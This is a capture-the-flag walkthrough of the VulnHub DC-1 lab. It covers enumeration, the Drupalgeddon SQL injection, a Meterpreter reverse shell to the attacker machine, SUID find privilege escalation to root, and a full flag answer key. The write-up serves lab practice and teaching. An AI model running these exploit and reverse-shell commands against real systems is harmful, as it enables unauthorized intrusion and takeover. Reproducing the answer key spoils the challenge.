# DC VulnHub (DC-1) Walkthrough

> **From Drupalgeddon to Root** — a complete Linux privilege-escalation walkthrough
>
> Based on the original write-up: [DC-1 VulnHub — From Drupalgeddon to Root](https://medium.com/@sharatsunnithan3/dc-1-vulnhub-from-drupalgeddon-to-root-a-complete-linux-privilege-escalation-walkthrough-0dfb6bafd7e4)

---

## Lab Topology

```
┌─────────────────────────────────────────────────────────────┐
│              VirtualBox NAT Network (10.0.2.0/24)           │
│                                                             │
│   ┌──────────────┐     ┌──────────────┐     ┌───────────┐  │
│   │   Attacker   │     │    Target    │     │    DC     │  │
│   │  10.0.2.3    │     │  10.0.2.7    │     │ 10.0.2.2  │  │
│   │  Kali Linux  │────▶│  DC VulnHub  │     │ UNVERIFIED│  │
│   │              │     │  port 80 up  │     │  AD down  │  │
│   └──────────────┘     └──────────────┘     └───────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

| Role | IP | MAC | Status |
|------|-----|-----|--------|
| Attacker | `10.0.2.3/24` | `08:00:27:54:a1:a7` | Kali Linux |
| Target | `10.0.2.7` | `08:00:27:03:92:83` | DC VulnHub / DC-1 |
| DC | `10.0.2.2` | `08:00:27:66:DB:91` | UNVERIFIED — AD/DNS/KDC closed |

---

## Result at a Glance

| | |
|---|---|
| **Initial Access** | Drupal 7.24 pre-auth SQL injection (CVE-2014-3704) |
| **Shell** | `www-data` via Meterpreter `php/linux` |
| **Privilege Escalation** | SUID `/usr/bin/find` → `euid=0` |
| **Flags Recovered** | 5 / 5 |
| **DC Status** | Down — no AD services reachable |

---

## Tooling

| Tool | Version |
|------|---------|
| Nmap | 7.991 |
| Metasploit Framework | 6.5.5-dev |
| Gobuster | 3.8.2 |
| Nikto | 2.6.1 |
| WhatWeb | 0.6.4 |
| curl | 8.22.0 |
| OpenSSH client | 10.6p1 Debian-1 |
| Python | 3.14.8 |

---

## 1 · First Contact

ICMP was treated as a reachability hint only, not proof of service health. All scans used `-Pn`.

```bash
$ ping -c 4 -W 2 10.0.2.7
64 bytes from 10.0.2.7: icmp_seq=1 ttl=64 time=0.969 ms
64 bytes from 10.0.2.7: icmp_seq=2 ttl=64 time=0.507 ms
64 bytes from 10.0.2.7: icmp_seq=3 ttl=64 time=0.681 ms
64 bytes from 10.0.2.7: icmp_seq=4 ttl=64 time=0.521 ms
```

**DC check at start** — all AD/DNS/KDC ports closed:

```
PORT     STATE  SERVICE
53/tcp   closed domain
88/tcp   closed kerberos-sec
389/tcp  closed ldap
445/tcp  closed microsoft-ds
636/tcp  closed ldapssl
3268/tcp closed globalcatLDAP
5985/tcp closed wsman
```

> The DC was reachable at the IP layer but had no AD DS, DNS, KDC, LDAP, SMB, or WinRM service. Logged as **DOWN/UNVERIFIED**. Phase 2b was skipped entirely.

---

## 2 · Port Scanning

### Quick Scan (top 1000)

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
```

### Full TCP Scan

```bash
$ nmap -Pn -p- -T4 --open -oN evidence/ports.txt 10.0.2.7
```

```
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
48036/tcp open  unknown
```

> 48036/tcp was later identified as `rpc.statd`, not a separate daemon.

### What Closed Ports Rule Out

| Missing Port | Ruled Out |
|-------------|-----------|
| 139/445 | SMB null session, MS17-010, share enum |
| 135 | RPC endpoint mapper |
| 3389 | RDP |
| 5985/5986 | WinRM |
| 389/636 | LDAP |
| 88 | Kerberos |
| 53 | DNS |
| 3268/3269 | Global Catalog |
| 21 | FTP |
| 3306 / 5432 / 6379 | Exposed databases |
| 2049 | NFS (TCP) |

### UDP Scan

```bash
$ nmap -Pn -sU --top-ports 50 -T4 -oN evidence/udp_top50.txt 10.0.2.7
```

```
111/udp  open   rpcbind
2049/udp closed nfs
```

> 34 open|filtered UDP ports — normal ambiguity, not proof of service.

---

## 3 · Service / Version Detection

```bash
$ nmap -Pn -sV -sC -p 22,80,111,48036 \
    --script=banner,http-title,http-headers,http-robots.txt,rpcinfo \
    -oN evidence/services.txt 10.0.2.7
```

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
|   X-Powered-By: PHP/5.4.45-0+deb7u14
|   X-Generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Drupal Site | Drupal Site
111/tcp   open  rpcbind 2-4 (RPC #100000)
48036/tcp open  status  1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Exact Drupal Version

```bash
$ grep -n "define('VERSION'" /var/www/includes/bootstrap.inc
11:define('VERSION', '7.24');
```

### Host & OS

```bash
$ hostname
DC-1

$ uname -a
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux

$ lsb_release -a
Description:    Debian GNU/Linux 7.11 (wheezy)
```

> The "Linux" nmap guess was correct, but exact distro/kernel came from local commands, not from nmap.

---

## 4 · Enumeration by Service

### 4.1 HTTP — Port 80

```bash
$ curl -i -sS http://10.0.2.7/
HTTP/1.1 200 OK
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.45-0+deb7u14
X-Generator: Drupal 7 (http://drupal.org)
Content-Type: text/html; charset=utf-8
```

`WhatWeb` confirmed:

```
Summary: Apache[2.2.22], Drupal, JQuery, MetaGenerator[Drupal 7],
         PHP[5.4.45-0+deb7u14]
```

#### Manual Path Probes

| Path | HTTP | Bytes | Note |
|------|------|-------|------|
| `/robots.txt` | 200 | 1561 | 36 disallowed entries |
| `/CHANGELOG.txt` | 404 | 296 | — |
| `/README.txt` | 200 | 5376 | — |
| `/user/login` | 200 | 7376 | — |
| `/user/register` | 200 | 8025 | not used (state change) |
| `/node/1` | 200 | 11509 | lorem ipsum |
| `/admin` | 403 | 7586 | — |
| `/install.php` | 200 | 3049 | "already installed" |
| `/xmlrpc.php` | 200 | 42 | — |
| `/sites/default/settings.php` | 200 | 0 | PHP executed, no output |
| `/sites/default/settings.php.bak` | 403 | 306 | blocked |
| `/.git/HEAD` | 403 | 285 | blocked |

#### Directory Brute Force — Timed Out

```bash
$ gobuster dir -u http://10.0.2.7/ -w /usr/share/wordlists/dirb/common.txt \
    -x php,txt,html -t 30 --timeout 10s -o evidence/gobuster_common.txt
# timed out after 300s — partial output only
```

> Drupal-specific list also timed out. Partial output showed `/authorize.php` 403, `/COPYRIGHT.txt` 200, and many `core/` 403s from a newer-Drupal wordlist. Not a complete listing.

#### Nikto — Partial

```bash
$ nikto -host http://10.0.2.7/ -nointeractive -output evidence/nikto.txt
# timed out after 300s
```

> Confirmed server headers, ETag inode disclosure on `/robots.txt`, 36 robots entries. No full run claimed.

#### Default Login Tests

| Username | Password | Result |
|----------|----------|--------|
| `admin` | `admin` | "unrecognized username or password" |
| `admin` | *(blank)* | "Password field is required" |

> No successful Drupal login. No brute force performed.

### 4.2 SSH — Port 22

```bash
$ nmap -Pn -sV -p22 \
    --script ssh-auth-methods,ssh-hostkey,ssh2-enum-algos \
    -oN evidence/ssh_enum.txt 10.0.2.7
```

```
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

Weak algorithms present: `arcfour`, `3des-cbc`, `blowfish-cbc`, `cast128-cbc`, `hmac-md5`, `diffie-hellman-group1-sha1`.

#### Default Credential Attempts (4 only)

| Username | Password | Result |
|----------|----------|--------|
| `root` | `root` | Permission denied |
| `root` | *(blank)* | Permission denied |
| `flag4` | `flag4` | Permission denied |
| `flag4` | *(blank)* | Permission denied |

> No Hydra. No lockout policy observed, but brute force was unnecessary and noisy.

### 4.3 RPC — Ports 111 & 48036

```bash
$ rpcinfo -p 10.0.2.7
   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100024    1   udp  42970  status
    100024    1   tcp  48036  status
```

```bash
$ showmount -e 10.0.2.7
clnt_create: RPC: Program not registered
```

> rpcbind and status service exposed, but **no NFS registered**. No mountable share.

### 4.4 Services Not Present

No SMB, RDP, LDAP, Kerberos, WinRM, FTP, or database enumeration was run — those ports were closed. Running those tools would only produce connection failures.

---

## 5 · Flags Found During Enumeration

### Flag 1

```
Source:  /var/www/flag1.txt
Command: cat /var/www/flag1.txt
```

> *Every good CMS needs a config file - and so do you.*

World-readable by `www-data` in the web root.

---

### Flag 2

```
Source: /var/www/sites/default/settings.php
```

The file begins with a comment literally labelled `flag2`:

```php
/**
 *
 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
 *
 */

$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      ...
    ),
  ),
);
```

> The credentials `dbuser:R0ck3t` were the actionable part.

---

### Flag 3

Flag 3 was **not a file** — it was an unpublished Drupal node in the database.

```bash
$ mysql -u dbuser -pR0ck3t -D drupaldb \
    -e 'select nid,title,type,status from node;'

nid  title  type  status
1    Main   page  1
2    flag3  page  0    ← unpublished
```

```bash
$ mysql -u dbuser -pR0ck3t -D drupaldb \
    -e 'select entity_id, body_value from field_data_body where entity_id=2;'

2    Special PERMS will help FIND the passwd - but you'll need to
     -exec that command to work out how to get what's in the shadow.
```

> Status `0` = unpublished → hidden from the site, but fully readable via SQL. *Unpublished ≠ secret.*

---

### Flag 4

```
Source:  /home/flag4/flag4.txt
Command: cat /home/flag4/flag4.txt
```

> *Can you use this same method to find or access the flag in root?*
>
> *Probably. But perhaps it's not that easy.  Or maybe it is?*

Owned by `flag4` but **world-readable** — no password needed.

---

### Final Flag

```
Source:  /root/thefinalflag.txt
Command: cat /root/thefinalflag.txt   (via SUID root shell)
```

> *Well done!!!!*
>
> *Hopefully you've enjoyed this and learned some new skills.*
>
> *You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7*

---

## 6 · Credentials & Initial Access

### Credentials Found

| Key | Value |
|-----|-------|
| Database | `drupaldb` |
| Username | `dbuser` |
| Password | `R0ck3t` |
| Host | `localhost` |

Validated locally through the `www-data` shell:

```bash
$ mysql -u dbuser -pR0ck3t -D drupaldb \
    -e 'select uid,name,pass,mail,status from users;'

uid  name   pass                                                   mail               status
1    admin  $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR  admin@example.com  1
2    Fred   $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg  fred@example.org   1
```

> Neither hash cracked. The DB credentials were enough to read the unpublished flag3 node.

---

### Drupalgeddon (CVE-2014-3704)

**Why this path:**
- Target was Drupal **7.24** — below the 7.32 fix.
- Searchsploit had multiple candidates: `34984.py`, `34992.py`, `34993.php`, `35150.php`, `44355.php`.
- Used the **Metasploit module** rather than a random public exploit — installed, readable, and its form-cache method cleans up after itself.

**Version check first:**

```bash
$ msfconsole -q -x 'use exploit/multi/http/drupal_drupageddon; \
    set RHOSTS 10.0.2.7; set RPORT 80; set TARGETURI /; check; exit'

[-] This module does not support check.
```

> Dead end — no built-in version probe. Moved to exploit with the exact version already verified locally.

**Resource file used:**

```ruby
spool /home/shrdx/Documents/DC_VulnHub/evidence/msf_console.log
use exploit/multi/http/drupal_drupageddon
set RHOSTS 10.0.2.7
set RPORT 80
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.2.3
set LPORT 4444
set ExitOnSession false
set Wait 5
exploit -j
sleep 20
sessions -l
sleep 600
```

**Output:**

```
[*] Started reverse TCP handler on 10.0.2.3:4444
[*] Sending stage (72682 bytes) to 10.0.2.7
[*] Meterpreter session 1 opened (10.0.2.3:4444 -> 10.0.2.7:44755)

Active sessions
===============
  Id  Name  Type                  Information      Connection
  --  ----  ----                  -----------      ----------
  1         meterpreter php/linux  www-data @ DC-1  10.0.2.3:4444 -> 10.0.2.7:44755
```

> The line *"Exploit completed, but no session was created"* was printed before the handler accepted the staged connection — the session list immediately after showed session 1. Not a failure.

**Why the form-cache method:**
- Injects two cache entries through the login form's SQL injection
- Triggers the cached form → runs PHP payload
- Calls `cache_clear_all` for generated form IDs
- **Does not** create a Drupal user, change admin password, or write a webshell to disk

> Did not use the *user-post* method — that would have created an admin account and content. Form-cache = smaller state change.

**Session:**

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> Meterpreter `ls` showed corrupted sizes/dates (e.g. file size `747324309678`, year `188498731153`) — a 32-bit PHP agent artifact. Used shell `cat`/`ls` output for evidence instead.

---

## 7 · Local Enumeration & Privilege Escalation

### Local Users

```
www-data:x:33:33:www-data:/var/www:/bin/sh
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
```

```bash
$ ls -la /home/flag4
-rw------- 1 flag4 flag4   28 .bash_history
-rw-r--r-- 1 flag4 flag4  125 flag4.txt      ← world-readable
```

> Could read `flag4.txt` but not `.bash_history` or `/root`.

### SUID Enumeration

```bash
$ find / -xdev -perm -4000 -type f 2>/dev/null
/bin/mount
/bin/ping
/bin/su
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find            ← deliberate misconfig
/usr/sbin/exim4
...
```

> `/usr/bin/find` is **not normally SUID** — this was a deliberate challenge misconfiguration.

`sudo` was not installed:

```bash
$ sudo -l
/bin/sh: 8: sudo: not found
```

### Attempt 1 — Failed

```bash
$ /usr/bin/find . -maxdepth 0 -exec /bin/sh -p \; -quit
/bin/sh: 0: Illegal option -p
```

> Debian's `/bin/sh` is dash, and this build rejected `-p`. **Dead end — not a failure of the SUID bit.**

### Attempt 2 — Success

```bash
$ /usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit

$ id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

> Real UID stayed 33, but **effective UID was 0** — enough to read root-owned files. Did not change root password, add users, or install anything.

### Root Flag

```bash
$ cat /root/thefinalflag.txt

Well done!!!!

Hopefully you've enjoyed this and learned some new skills.

You can let me know what you thought of this little journey
by contacting me via Twitter - @DCAU7
```

```bash
$ ls -la /root
drwx------ 4 root root 4096 .
drwxr-xr-x 23 root root 4096 ..
-rw------- 1 root root   44 .bash_history
-rw-r--r-- 1 root root  949 .bashrc
drwxr-xr-x 3 root root 4096 .drush
-rw-r--r-- 1 root root  140 .profile
-rw-r--r-- 1 root root  173 thefinalflag.txt
```

> Root `.bash_history` was not read — not needed for the flag or the access path.

---

## 8 · Final Answer Key

| # | Flag / Answer | Source |
|---|---------------|--------|
| 1 | Every good CMS needs a config file - and so do you. | `/var/www/flag1.txt` |
| 2 | Brute force and dictionary attacks aren't the only ways to gain access (and you WILL need access). What can you do with these credentials? <br>**DB:** `drupaldb` / `dbuser` / `R0ck3t` | `/var/www/sites/default/settings.php` |
| 3 | Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow. | Drupal DB — `field_data_body.entity_id=2` (node `nid=2`, title `flag3`, unpublished) |
| 4 | Can you use this same method to find or access the flag in root? <br>Probably. But perhaps it's not that easy.  Or maybe it is? | `/home/flag4/flag4.txt` |
| 5 | Well done!!!! … contact @DCAU7 | `/root/thefinalflag.txt` |

Exact file copies: `evidence/flag1.txt` → `evidence/thefinalflag.txt`.

---

## 9 · Vulnerabilities / Weaknesses Used

| # | Vulnerability | Impact |
|---|---------------|--------|
| 1 | **Drupal 7.24 pre-auth SQLi** (CVE-2014-3704, "Drupalgeddon") — login form `name` param passed through `expandArguments()` unsafely | Initial access as `www-data` |
| 2 | **Sensitive config in web root** — `settings.php` contained flag2 comment + `dbuser:R0ck3t` | DB read access after RCE |
| 3 | **Unpublished content stored in DB** — flag3 node hidden from UI but fully readable via SQL | Information disclosure |
| 4 | **SUID root `/usr/bin/find`** — `-exec` inherits euid → `/bin/bash -p` gives `euid=0` | Root privilege escalation |
| 5 | **End-of-life stack** — Debian 7.11, Apache 2.2.22, PHP 5.4.45, Drupal 7.24, OpenSSH 6.0p1 | Enabled the Drupal exploit |
| 6 | **Exposed rpcbind / status** — 111 + 48036/tcp (no NFS export) | Unnecessary exposure |

---

## 10 · Dead Ends / What Did Not Work

| Attempt | Result |
|---------|--------|
| DC `10.0.2.2` AD ports | All closed — Phase 2b skipped entirely |
| `/CHANGELOG.txt` | 404 — version had to come from `bootstrap.inc` |
| `/sites/default/settings.php` over HTTP | 200 with 0 bytes — PHP executed, not downloadable |
| `settings.php.bak`, `settings.php~`, `.git/HEAD` | 403 |
| `/user/1`, `/user/2`, `/admin`, `/cron.php`, `/update.php` | 403 |
| `admin/admin`, `admin/blank` Drupal login | Failed |
| `root/root`, `root/blank`, `flag4/flag4`, `flag4/blank` SSH | Failed |
| Generic gobuster | Timed out (300s) |
| Drupal-specific gobuster | Timed out (300s) — partial output had newer-Drupal paths |
| Nikto | Timed out (300s) — partial findings only |
| MSF `drupal_drupageddon` `check` | "module does not support check" |
| SUID `find` with `/bin/sh -p` | `Illegal option -p` (dash) |
| Meterpreter `download /root/thefinalflag.txt` | `stdapi_fs_stat: Operation failed: 1` — Meterpreter was `www-data`, not root |
| First cleanup as `www-data` | Could not delete root-owned `/tmp` copies — second cleanup via SUID shell succeeded |
| NFS | `showmount` → "Program not registered" |
| SMB/RDP/LDAP/Kerberos/WinRM/FTP/DB | Not present on target |

> All MySQL queries were **SELECT-only**. The only DB writes were the Drupalgeddon `cache_form` inserts performed by the exploit; the module's payload calls `cache_clear_all` for its generated form IDs. Cache table was not diffed independently.

---

## 11 · What I Learned

> *Old but working* is still dangerous. The Drupal version was **five years behind** the fix for Drupalgeddon, and the entire stack was Debian 7. The web app gave a low-privilege shell, but the real escalation was a single SUID binary that should never have been SUID.

**Flag design made a point:** unpublished content is not protected content. Flag 3 was hidden from the site but fully readable with the DB credentials from `settings.php`. The DB user wasn't a Drupal admin — but it had enough read access to expose the node body.

**The DC being down didn't block the assessment** because the target was a standalone Linux host. The DC was re-checked at start and end instead of assuming it would stay unavailable. No domain-side validation was possible, so none was claimed.

**Cleanup mattered.** The exploit itself was designed to clear its cache entries, but evidence collection created two root-owned `/tmp` files. A second session through the SUID shell was needed to remove them. Final check returned `CLEANUP_OK`, and no Metasploit listener remained.

---

## 12 · Evidence / File Index

All paths under `/home/shrdx/Documents/DC_VulnHub/evidence/`.

### Scanning & Services

| File | Contents |
|------|----------|
| `quick_ports.txt` | Top-1000 TCP scan |
| `ports.txt` | Full TCP scan |
| `services.txt` | Version/script scan |
| `services_console.txt` | Console copy of service scan |
| `udp_top50.txt` | UDP top-50 scan |
| `rpcinfo_tcp.txt` | `rpcinfo -p` output |
| `showmount.txt` | showmount failure + status check |
| `ssh_enum.txt` | SSH auth methods, host keys, algorithms |
| `ssh_default_attempts.txt` | Batch-mode attempts (inconclusive; kept for honesty) |
| `ssh_password_attempts.txt` | Actual password attempts via `SSH_ASKPASS` |
| `dc_recheck.txt` | Initial DC port check |
| `dc_final_recheck.txt` | Final DC port check |
| `post_ping.txt` | Final target HTTP check |

### Web

| File | Contents |
|------|----------|
| `web_index.html` | Rendered front page |
| `web_headers.txt` | Response headers |
| `web_index_headers.html` | Headers + body from first fetch |
| `web_robots.txt` | robots.txt |
| `web_README.txt` | Drupal README |
| `web_user_login` | Login page |
| `web_user_register` | Registration page |
| `web_user_password` | Password reset page |
| `web_node_1` | Node 1 |
| `web_install.php` | install.php page |
| `web_xmlrpc.php` | xmlrpc.php response |
| `web_login_default.txt` | admin/admin and admin/blank attempts |
| `whatweb.txt` | WhatWeb output |
| `nikto.txt` / `nikto_console.txt` | Partial Nikto output (timed out) |
| `gobuster_common.txt` | Partial generic gobuster (timed out) |
| `gobuster_drupal.txt` | Partial Drupal gobuster (timed out) |
| `probe_*` | Manual path probes and 403/404 responses |

### Version & Source

| File | Contents |
|------|----------|
| `bootstrap.inc` | Downloaded Drupal bootstrap file |
| `drupal_version.txt` | Exact `VERSION` line: `7.24` |
| `settings.php` | Downloaded Drupal settings file |
| `flag2.txt` | Exact flag2 comment + DB credentials |

### Flags & Database

| File | Contents |
|------|----------|
| `flag1.txt` | Flag 1 |
| `flag3.txt` | Flag 3 body |
| `flag4.txt` | Flag 4 |
| `thefinalflag.txt` | Root flag |
| `mysql_users.txt` | Drupal users table excerpt |
| `mysql_node_flag3.txt` | Flag3 node body query output |
| `privesc.txt` | `euid=0` proof line |

### Session & Cleanup

| File | Contents |
|------|----------|
| `msf_console.log` | Full Metasploit console spool |
| `msf_drupageddon_check.txt` | "module does not support check" result |
| `cleanup.txt` | `CLEANUP_OK` proof |
| `session_log.txt` | Date, scope, tool versions, summary |

> No SMB, RDP, LDAP, Kerberos, WinRM, FTP, or NFS evidence files were created. The DC had no open AD ports, so no `dc_*` query output exists beyond the two port checks.

---

## Reference

**Original write-up:** [DC-1 VulnHub — From Drupalgeddon to Root: A Complete Linux Privilege Escalation Walkthrough](https://medium.com/@sharatsunnithan3/dc-1-vulnhub-from-drupalgeddon-to-root-a-complete-linux-privilege-escalation-walkthrough-0dfb6bafd7e4)

---

<div align="center">

**DC-1 · VulnHub · Authorized Lab Assessment**

*Drupalgeddon → www-data → SUID find → root*

</div>
